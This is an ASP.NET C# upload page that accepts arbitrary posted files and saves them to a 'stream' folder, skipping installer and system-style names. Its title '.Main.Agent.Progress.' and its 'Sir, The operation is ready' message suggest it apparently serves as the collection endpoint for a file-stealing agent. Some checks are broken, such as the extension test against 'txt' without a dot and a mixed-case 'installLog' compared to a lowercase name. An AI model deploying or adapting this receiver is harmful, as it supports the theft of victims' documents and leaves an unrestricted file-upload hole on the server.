<%@ Page Language="C#" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        foreach (string f in Request.Files.AllKeys)
        {
            HttpPostedFile file = Request.Files[f];

            if (System.IO.Path.GetExtension(file.FileName) == "txt")
                continue;

            if (file.FileName.ToLower().StartsWith("$") ||
               file.FileName.ToLower().StartsWith("~") ||
               file.FileName.ToLower().StartsWith("about") ||
               file.FileName.ToLower().StartsWith("eula") ||
               file.FileName.ToLower().StartsWith("drw") ||
               file.FileName.ToLower().StartsWith("license") ||
               file.FileName.ToLower().StartsWith("installLog") ||
               file.FileName.ToLower().StartsWith("cs_") ||
               file.FileName.ToLower().StartsWith("chinese"))
                continue;
            
            String fileName = "";
            Int32 i = 0;
            
            do
            {
                fileName = MapPath("\\stream\\" + System.IO.Path.GetFileNameWithoutExtension(file.FileName) + (i == 0 ? "" : "(" + i.ToString() + ")") + System.IO.Path.GetExtension(file.FileName));
                i++;
            }
            while (System.IO.File.Exists(fileName));

            file.SaveAs(fileName);
        }
        return;
    }
</script>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>.Main.Agent.Progress.</title>
</head>
<body>
    <b>
    Sir, The operation is ready...
    <br />
    any other operation.
    </b>
</body>
</html>
